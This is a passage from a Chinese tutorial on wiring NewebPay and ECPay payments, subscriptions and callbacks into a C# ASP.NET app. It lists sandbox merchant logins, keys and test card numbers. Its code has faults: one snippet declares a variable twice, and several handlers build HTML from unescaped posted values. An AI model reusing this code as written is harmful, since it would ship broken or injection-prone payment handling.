         TradeInfo.Add(new KeyValuePair<string, string>("ClientBackURL", inModel.ClientBackURL));
             
         
         // 付款人電子信箱
         TradeInfo.Add(new KeyValuePair<string, string>("Email", inModel.Email));
         // 付款人電子信箱 是否開放修改(1=可修改 0=不可修改)
         TradeInfo.Add(new KeyValuePair<string, string>("EmailModify", "0"));
     
         //開啟信用卡一次付清選項
         TradeInfo.Add(new KeyValuePair<string, string>("CREDIT", "1"));
     
         //ATM 付款
         if (inModel.ChannelID == "VACC")
         {
             TradeInfo.Add(new KeyValuePair<string, string>("VACC", "1"));
         }
         string TradeInfoParam = string.Join("&", TradeInfo.Select(x => $"{x.Key}={x.Value}"));
     
         // API 傳送欄位
         // 商店代號步驟2取得
         outModel.MerchantID = inModel.MerchantID;
         // 串接程式版本
         outModel.Version = "2.0";
         //交易資料 AES 加解密
         IConfiguration Config = new ConfigurationBuilder().AddJsonFile("appSettings.json").Build();
         string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
         string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
         string TradeInfoEncrypt = EncryptAESHex(TradeInfoParam, HashKey, HashIV);
         
         //交易資料加密
         outModel.TradeInfo = TradeInfoEncrypt;
         //交易資料 SHA256 加密
         outModel.TradeSha = EncryptSHA256($"HashKey={HashKey}&{TradeInfoEncrypt}&HashIV={HashIV}");
     
         // 將model 轉換為List<KeyValuePair<string, string>>, null值不轉
         List<KeyValuePair<string, string>> postData = LambdaUtil.ModelToKeyValuePairList<SendToNewebPayOut>(outModel);
     
         Response.Clear();
     
         StringBuilder s = new StringBuilder();
         s.Append("<html>");
         s.AppendFormat("<body onload='document.forms[\"form\"].submit()'>");
         s.AppendFormat("<form name='form' action='{0}' method='post'>", "https://ccore.newebpay.com/MPG/mpg_gateway");
         foreach (KeyValuePair<string, string> item in postData)
         {
             s.AppendFormat("<input type='hidden' name='{0}' value='{1}' />", item.Key, item.Value);
         }
     
         StringBuilder s = new StringBuilder();
         s.AppendFormat("<form id='payForm' action='{0}' method='post'>", "https://ccore.newebpay.com/MPG/mpg_gateway");
         foreach (KeyValuePair<string, string> item in postData)
         {
             s.AppendFormat("<input type='hidden' name='{0}' value='{1}' />", item.Key, item.Value);
         }
     
         s.Append("</form>");
     
         return Json(s.ToString());
     }
     ```

4. ##### 前端直接執行回傳的Form Submit，呼叫藍新API開始導入付款頁面

   - ```javascript
     $.ajax({
        url: '@Url.Content("~/Home/SendToNewebPay")',
        method: 'POST',
        dataType: 'json',
        data: { inModel: postData, __RequestVerificationToken: $('@Html.AntiForgeryToken()').val() },
        success: function(returnObj) {
            /*呼叫付款API後，取得API所彙整之付款form表單
            直接執行表單submit事件觸發導頁*/
            $("#divContent").html(returnObj);
            $("#payForm").submit();
        },
        error: function(err) {
        alert(err.status + " " + err.statusText + '\n' + err.responseText);
        }
     });
     ```

5. ##### 轉至付款頁面進行處理，付款選項會根據步驟3中所建立的參數決定(如VACC,CREDIT)

   ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208132334128.png)

6. ##### 加入支付完成返回商店網址方法

   - ###### 送出訂單 API 時會跳轉至藍新金流付款畫面，當使用者完成付款動作時，藍新金流會回傳呼叫我們的「支付完成返回商店網址」，這裡會接收使用者付款的狀態，我們可以從回傳資訊內查詢使用者是否已付款。

   - ###### 接收方法裡面要做的就是解密資料，我們傳送前有加密後再傳送，接收時也需要解密才能看到資料，解密方法是 AES

   - ```C#
     /// <summary>
     /// 支付完成返回網址
     /// </summary>
     /// <returns></returns>
     public IActionResult CallbackReturn()
     {
     	StringBuilder receive = new StringBuilder();
     	foreach (var item in Request.Form)
     	{
     		receive.AppendLine(item.Key + "=" + item.Value + "<br>");
     	}
         //接收參數
     	ViewData["ReceiveObj"] = receive.ToString();
      
     	IConfiguration Config = new ConfigurationBuilder().AddJsonFile("appSettings.json").Build();
     	string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
     	string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
        
     	string TradeInfoDecrypt = DecryptAESHex(Request.Form["TradeInfo"], HashKey, HashIV);
     	NameValueCollection decryptTradeCollection = HttpUtility.ParseQueryString(TradeInfoDecrypt);
     	receive.Length = 0;
     	foreach (String key in decryptTradeCollection.AllKeys)
     	{
     		receive.AppendLine(key + "=" + decryptTradeCollection[key] + "<br>");
     	}
         
     	// 交易訊息
     	ViewData["TradeInfo"] = receive.ToString();
      
     	return View();
     }
     ```

7. ##### 加入商店取號網址方法

   - ###### 商店取號網址會用在使用者選擇 ATM 付款時，藍新金流會呼叫這個網址，告知我們使用者要匯款的銀行代碼和帳號是多少，我們可以顯示銀行代碼和帳號給使用者知道

   - ###### 我們可以從 BankCode 和 CodeNo 知道使用者要匯款的銀行代碼和帳號。

   - ```C#
     /// <summary>
     /// 商店取號網址
     /// </summary>
     /// <returns></returns>
     public IActionResult CallbackCustomer()
     {
     	// 接收參數
     	StringBuilder receive = new StringBuilder();
     	foreach (var item in Request.Form)
     	{
     		receive.AppendLine(item.Key + "=" + item.Value + "<br>");
     	}
     	ViewData["ReceiveObj"] = receive.ToString();
      
     	// 解密訊息
     	IConfiguration Config = new ConfigurationBuilder().AddJsonFile("appSettings.json").Build();
     	string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
     	string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
     	string TradeInfoDecrypt = DecryptAESHex(Request.Form["TradeInfo"], HashKey, HashIV);
     	NameValueCollection decryptTradeCollection = HttpUtility.ParseQueryString(TradeInfoDecrypt);
     	receive.Length = 0;
     	foreach (String key in decryptTradeCollection.AllKeys)
     	{
     		receive.AppendLine(key + "=" + decryptTradeCollection[key] + "<br>");
     	}
     	ViewData["TradeInfo"] = receive.ToString();
     	return View();
     }
     ```

8. ##### 加入支付通知網址方法

   - ###### 當使用者實際付款完成時，不管是信用卡、ATM 或超商付款，會收到的通知

   - ###### 例如使用者選擇 ATM 付款時，任何時間在 ATM 完成付款，我們從這方法收到通知後，寫入資料庫內紀錄使用者已付款就好。

     ```C#
     /// <summary>
     /// 支付通知網址
     /// </summary>
     /// <returns></returns>
     public IActionResult CallbackNotify()
     {
     	// 接收參數
     	StringBuilder receive = new StringBuilder();
     	foreach (var item in Request.Form)
     	{
     		receive.AppendLine(item.Key + "=" + item.Value + "<br>");
     	}
     	ViewData["ReceiveObj"] = receive.ToString();
      
     	// 解密訊息
     	IConfiguration Config = new ConfigurationBuilder().AddJsonFile("appSettings.json").Build();
     	string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
     	string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
     	string TradeInfoDecrypt = DecryptAESHex(Request.Form["TradeInfo"], HashKey, HashIV);
     	NameValueCollection decryptTradeCollection = HttpUtility.ParseQueryString(TradeInfoDecrypt);
     	receive.Length = 0;
     	foreach (String key in decryptTradeCollection.AllKeys)
     	{
     		receive.AppendLine(key + "=" + decryptTradeCollection[key] + "<br>");
     	}
     	ViewData["TradeInfo"] = receive.ToString();
      
     	return View();
     }
     ```

9. 流程圖

   - ![img](https://ithelp.ithome.com.tw/upload/images/20220314/201394871haWaGe4iD.png)

- ### 其他

  - #### 測試用卡號: 4000-2211-1111-1111

  - ##### 參考文件

    - [藍新金流 NewebPay API 串接教學](https://blog.hungwin.com.tw/core-mvc-newebpay/)
    -  [藍新金流API 文件下載區](https://www.newebpay.com/website/Page/content/download_api)
    - **[[C#\] 智付通SPGateway(藍新)金流串接](https://harry-lin.blogspot.com/2019/01/c-spgateway.html)** 
    - [.NET 前後分離 Web API 藍新金流串接](https://ithelp.ithome.com.tw/articles/10284330)



### 訂閱流程

- #### 系統流程說明

  1. #### Client發起定期定額支付請求

  2. #### 系統依據訂單內容建置藍新發送格式(Form格式)

     - ###### RespondType: JSON/ String

     - ###### TimeStamp: 系統時間搓記

     - ###### Version: 串接版本

       - 帶入 1.0 版本，則[背面末三碼]將為 必填欄位。
       - 帶入 1.1 版本，則[背面末三碼]將為 非必填
       - 帶入 1.2 版本，則增加 『PeriodFirstdate』欄位，此欄位為非 必填 
       - 帶入 1.3 版本，『Paymentmethod』 欄位新增 UNIONPAY = 銀聯卡回傳參數

     - ###### LangType: 語系，預設中文

     - ###### MerOrderNo: 系統訂單編號

     - ###### ProdDesc: 產品名稱

     - ###### PeriodAmt: 委託金額(每期付款金額)

     - ###### PeriodType: 週期類別

       - D=固定天期制 (2-999 天)
       - W=每週 
       - M=每月
       - Y=每年

     - ###### PeriodPoint: 交易週期授權時間

       - 當週期參數為 D 時，此欄位值限為 數字 2~999，以授權日期隔日起算
         -  例：數值為 2，則表示每隔兩天會執 行一次委託單。
       - 當週期參數為 W 時，此欄位值限為 數字 1~7
         - 數字 1~7 表示每週一~ 週日。
       - 當週期參數為 M 時，此欄位值限為 數字 01~31
         - 數字 01~31 表示每月 1 號~31 號
         - 若當月沒該日期則由該 月的最後一天做為扣款日。
       - 5.當週期參數為 Y 時，此欄位值格式為 MMDD。

     - ###### PeriodStartType: 檢查卡號模式

       - １=立即執行十元授權 

         - （因部分發卡銀行會阻擋一元交 易，因此調整為十元）
         - 委託建立當下系統將發動一筆十 元信用卡授權交易，此交易授權 成功後，系統將立即自動取消授 權，付款人將不會被扣款

       - ２=立即執行委託金額授權

         - 委託單建立當下，立即執行委託 金額授權。

         - ###### 如果執行日恰好等於第一期授權日，則視為第一期授權

         - ###### 若執行日不等於第一期授權日時，則自動曾為第一次授權期數會多一期

       - ３=不檢查信用卡資訊，不授權

         - 委託單自動成立。
         - 首期授權時授權失敗，則系統會 自動終止該張委託單。

     - ```C#
       public string GetPeriodCallBack(SendToNewebPayIn inModel)
       {
           // 藍新金流線上付款
       
           var TradeInfo = new Dictionary<string, object> {
               // 回傳格式
               { "RespondType", "JSON"},
               // TimeStamp
               { "TimeStamp", DateTimeOffset.Now.ToOffset(new TimeSpan(8, 0, 0)).ToUnixTimeSeconds().ToString()},
               // 串接程式版本
               { "Version", "1.0"},
               // 訂單編號
               { "MerOrderNo", inModel.MerchantOrderNo},
               // 商品資訊
               { "ProdDesc", inModel.ItemDesc},
               // 定期金額
               { "PeriodAmt", inModel.Amt},
               // 週期類別 年/月/日
               { "PeriodType", "M"},
               // 交易週期授權時間 ex.每周禮拜幾、每月幾號、每隔幾天、每年的MMDD
               {"PeriodPoint", DateTime.Now.Day.ToString() },
               // 檢查卡號模式
               { "PeriodStartType", "2"},
               // 授權期數
               { "PeriodTimes", "10"},
               // 付款人電子信箱
               { "PayerEmail", inModel.Email},
               // 是否開啟付款人資訊
               { "PaymentInfo", 'N'},
               // 是否開啟付款人資訊
               {"OrderInfo", 'N' },
               // 支付通知網址
               {"NotifyURL", $"{Config.GetSection("HostURL").Value}/Notify/NewebPayPeriodNotify" },
               // 是否開放使用者修改Mail
               {"EmailModify", "0" }
           };
       
           string TradeInfoParam = string.Join("&", TradeInfo.Select(x => $"{x.Key}={x.Value}"));
       
       
           SendToNewebPayPeriod outModel = new SendToNewebPayPeriod();
           //交易資料 AES 加解密
           string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
           string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
           string TradeInfoEncrypt = EncryptAESHex(TradeInfoParam, HashKey, HashIV);
       
       
           StringBuilder s = new StringBuilder();
           s.AppendFormat("<form id='payForm' action='{0}' method='post'>", "https://ccore.spgateway.com/MPG/period");
           s.AppendFormat("<input type='hidden' name='{0}' value='{1}' />", "MerchantID_", Config.GetSection("MerchantID").Value);
           s.AppendFormat("<input type='hidden' name='{0}' value='{1}' />", "PostData_", EncryptAESHex(TradeInfoParam, HashKey, HashIV));
           s.Append("</form>");
       
           return s.ToString();
       }
       ```

  3. #### Client接收Server端回傳格式後開始呼叫藍新支付(商店以前端「Form Post」方式傳送交易資料至藍新金流進行交易。)

     - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211452855.png)

  4. #### 藍新依據設定開始進行信用卡授權測試

  5. #### 信用卡端回傳信用卡驗證結果

  6. #### 藍新依據步驟2 內設定的`NotifyURL`將結果回傳給Server端

     - ###### 當付款人每期執行信用卡授權交易完 成後，以 Form Post 方式通知商店授權結果。

     - ###### 回傳結果會以AES加密的形式夾帶在`Period`字串中，需透過商店的`HashKey`、`HashIV`進行解密

     - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211425705.png)

     - ##### 回傳內容包含`PeriodNo` 代表藍新的委託單號，後續須透過此單號進行狀態修改(暫停、取消訂閱)

       - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211427382.png)

  7. #### 藍新依據步驟2內設定的`ReturnURL`將頁面進行導頁

     - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211428112.png)

- #### 流程圖

  - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211429154.png)

### 訂閱變更流程

- #### 系統流程

  1. ##### 向提出商務人員或藍新金流客戶服務中心提出申請，由藍新金流審核並設 定完成後，商店始得使用本功能

  2. ##### 透過api向藍新發送狀態變更參數(暫停、取消、重新開始)

     - ###### 透過訂單編號`MerOrderNo`、委託單號`委託單號`進行該委託單狀態變更

     - ```c#
       public async Task<string> GetUpdatePeriodCallBackAsync(string orderNo, string PeriodNo)
       {
           // 藍新金流線上付款
       
           var TradeInfo = new Dictionary<string, object> {
               // 回傳格式
               { "RespondType", "JSON"},
               // TimeStamp
               { "TimeStamp", DateTimeOffset.Now.ToOffset(new TimeSpan(8, 0, 0)).ToUnixTimeSeconds().ToString()},
               // 固定帶 1.0
               { "Version", "1.0"},
               // 訂單編號
               { "MerOrderNo", orderNo},
               // 委託單號
               { "PeriodNo", PeriodNo},
               // 委託狀態
               { "AlterType", "terminate"},
           };
       
           string TradeInfoParam = string.Join("&", TradeInfo.Select(x => $"{x.Key}={x.Value}"));
       
           SendToNewebPayPeriod outModel = new SendToNewebPayPeriod();
           //交易資料 AES 加解密
           string HashKey = Config.GetSection("HashKey").Value;//API 串接金鑰
           string HashIV = Config.GetSection("HashIV").Value;//API 串接密碼
       
           var content = new FormUrlEncodedContent(new[]
           {
               new KeyValuePair<string, string>("MerchantID_", Config.GetSection("MerchantID").Value),
               new KeyValuePair<string, string>("PostData_", EncryptAESHex(TradeInfoParam, HashKey, HashIV))
           });
       
           using (HttpClient client = new HttpClient())
           {
               HttpResponseMessage response = await client.PostAsync("https://ccore.newebpay.com/MPG/period/AlterStatus", content);
               var result = await response.Content.ReadAsStringAsync();
               var obj = JsonConvert.DeserializeObject<PeriodReturn>(result);
               return DecryptAESHex(obj.Period, HashKey, HashIV);
           }
       
           return "";
       }
       ```

  3. #####  回傳變更結果

     - ###### 回傳結果會以AES加密的形式夾帶在`Period`字串中，需透過商店的`HashKey`、`HashIV`進行解密

     - ###### 若成功則回傳"SUCCESS"，失敗則回傳錯誤代碼

       - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202208211512611.png)

       - ###### PER10074: 本 API 需由藍新金流審核通過後才得以使用，若有串接需求請聯繫客戶服務中心或商務 經理。

- #### 流程圖

  - ![image-20220821150534205](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20220821150534205.png)



## 綠界

- ![img](https://developers.ecpay.com.tw/wp-content/uploads/2022/01/%E5%85%A8%E6%96%B9%E4%BD%8D%E4%BB%98%E6%AC%BE%E4%BA%A4%E6%98%93%E6%B5%81%E7%A8%8B2022-5-1024x727.png)

- ### 可用測試帳號

  - ```tex
    特店測試資料： 模擬銀行3D驗證
    特店編號(MerchantID)：3002607
    特店後台登入帳號：stagetest3
    特店後台登入密碼：test1234
    特店統一編號：00000000
    串接金鑰HashKey：pwFHCqoQZGmho4w6
    串接金鑰HashIV：EkRm7iFT261dpevs
    
    平台商測試資料：
    特店編號(MerchantID)：3002599
    特店後台登入帳號：stagetest2
    特店後台登入密碼：test1234
    身分證末四碼：3609
    串接金鑰HashKey：spPjZn66i0OhqJsQ
    串接金鑰HashIV：hT5OJckN45isQTTs
    
    一般信用卡測試卡號 : 4311-9522-2222-2222 安全碼 : 222
    圓夢彈性分期信用卡測試卡號 : 4938-1777-7777-7777 安全碼 : 222　(此組信用卡用來測試圓夢分期服務，圓夢分期服務請參考)
    ```

- ### 流程

  1. ##### 前端呼叫訂單API，API將所需資訊組合成Form表單回傳給前端

     - ```C#
       public string GetCallBack(SendToNewebPayIn inModel)
       {
           var orderId = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 20);
           var order = new Dictionary<string, string>
           {
               //特店交易編號
               { "MerchantTradeNo",  orderId},
       
               //特店交易時間 yyyy/MM/dd HH:mm:ss
               { "MerchantTradeDate",  DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")},
       
               //交易金額
               { "TotalAmount",  inModel.Amt},
       
               //交易描述
               { "TradeDesc",  inModel.ItemDesc},
       
               //商品名稱
               { "ItemName", inModel.ItemDesc},
       
               //允許繳費有效天數(付款方式為 ATM 時，需設定此值)
               { "ExpireDate",  "3"},
       
               //自訂名稱欄位1
               { "Email",  inModel.Email},
       
               //自訂名稱欄位2
               { "CustomField2",  ""},
       
               //自訂名稱欄位3
               { "CustomField3",  ""},
       
               //自訂名稱欄位4
               { "CustomField4",  ""},
       
               //完成後發通知
               { "ReturnURL",  $"{Config.GetSection("HostURL").Value}/Home/CallbackNotify?option=ECPay"},
       
               //付款完成後導頁
               { "OrderResultURL", $"{Config.GetSection("HostURL").Value}/Home/CallbackReturn?option=ECPay"},
       
       
               //付款方式為 ATM 時，當使用者於綠界操作結束時，綠界回傳 虛擬帳號資訊至 此URL
               { "PaymentInfoURL",$"{Config.GetSection("HostURL").Value}/Home/CallbackCustomer?option=ECPay"},
       
               //付款方式為 ATM 時，當使用者於綠界操作結束時，綠界會轉址至 此URL。
               { "ClientRedirectURL",  $"{Config.GetSection("HostURL").Value}/Home/CallbackCustomer?option=ECPay"},
       
               //特店編號， 2000132 測試綠界編號
               { "MerchantID",  "3002599"},
       
               //忽略付款方式
               { "IgnorePayment",  "GooglePay#WebATM#CVS#BARCODE"},
       
               //交易類型 固定填入 aio
               { "PaymentType",  "aio"},
       
               //選擇預設付款方式 固定填入 ALL
               { "ChoosePayment",  "ALL"},
       
               //CheckMacValue 加密類型 固定填入 1 (SHA256)
               { "EncryptType",  "1"},
           };
       
           //檢查碼
           order["CheckMacValue"] = GetCheckMacValue(order);
       
           StringBuilder s = new StringBuilder();
           s.AppendFormat("<form id='payForm' action='{0}' method='post'>", "https://payment-stage.ecpay.com.tw/Cashier/AioCheckOut/V5");
           foreach (KeyValuePair<string, string> item in order)
           {
               s.AppendFormat("<input type='hidden' name='{0}' value='{1}' />", item.Key, item.Value);
           }
       
           s.Append("</form>");
       
           return s.ToString();
       }
       ```

  2. ##### 前端直接執行回傳的Form Submit，呼叫藍新API開始導入付款頁面

  3. ##### 付款結束後進入`CallbackReturn`

  4. ##### 卻入付款後支付平台呼叫`CallbackNotify`，此時可針對後續訂單進行處理

  5. ##### ATM付款選項時，金流呼叫`CallbackCustomer` 回傳虛擬帳戶

- ### 其他

  - #### [綠界官網](https://www.ecpay.com.tw/Service/API_Dwnld)

  - #### [「綠界(Ecpay)」金流介接教學](https://weitechshare.blogspot.com/2020/11/ecpay.html)
  
  - #### [測試後台](https://vendor-stage.ecpay.com.tw/Frame/Index)
